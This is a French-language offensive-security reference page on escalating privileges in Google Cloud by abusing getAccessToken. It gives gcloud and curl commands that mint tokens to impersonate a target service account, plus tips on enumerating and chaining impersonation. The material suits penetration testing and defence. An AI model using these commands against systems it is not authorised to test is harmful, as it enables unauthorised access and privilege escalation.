---
title: "getAccessToken : générer un jeton OAuth pour un compte de service"
description: "Générer un jeton d'accès OAuth à courte durée de vie pour un compte de service cible avec iam.serviceAccounts.getAccessToken (generateAccessToken)."
keywords:
  - getAccessToken
  - generateAccessToken
  - jeton d'accès
  - compte de service
  - usurpation d'identité
---

# getAccessToken

`iam.serviceAccounts.getAccessToken` (l'API `generateAccessToken`, détenue par `roles/iam.serviceAccountTokenCreator`) génère un jeton d'accès OAuth à courte durée de vie pour un compte de service cible. C'est l'usurpation d'identité la plus directe : pas de clé, pas de déploiement, il suffit de demander à IAM Credentials le jeton de la cible et d'agir aussitôt en tant que celle-ci.

## Générer et utiliser le jeton

```bash
# built into gcloud: run any command as the target SA
gcloud compute instances list --impersonate-service-account <target>@<proj>.iam.gserviceaccount.com

# or mint the raw token
gcloud auth print-access-token --impersonate-service-account <target>@<proj>.iam.gserviceaccount.com

# REST
curl -s -X POST -H "Authorization: Bearer $(gcloud auth print-access-token)" \
  "https://iamcredentials.googleapis.com/v1/projects/-/serviceAccounts/<target>@<proj>.iam.gserviceaccount.com:generateAccessToken" \
  -d '{"scope":["https://www.googleapis.com/auth/cloud-platform"]}'
```

## Notes d'exploitation

- Token Creator sur un compte de service plus privilégié est une escalade complète ; énumérez qui vous pouvez usurper à partir de la politique IAM.
- Le jeton est à courte durée de vie (une heure par défaut) mais régénérable tant que vous détenez la permission.
- Enchaînez-le : usurpez SA-A, puis utilisez le Token Creator de A sur SA-B pour atteindre B ([délégation implicite](implicit-delegation.md)).

## Outils

- **gcloud** (`--impersonate-service-account`, `auth print-access-token`).

## Références

- [Rhino Security Labs : escalade de privilèges GCP (partie 2)](https://rhinosecuritylabs.com/gcp/privilege-escalation-google-cloud-platform-part-2/)
- [HackTricks Cloud : usurpation d'identité de compte de service](https://cloud.hacktricks.wiki/en/pentesting-cloud/gcp-security/gcp-privilege-escalation/index.html)
- [Google : créer des identifiants à courte durée de vie](https://cloud.google.com/iam/docs/create-short-lived-credentials-direct)
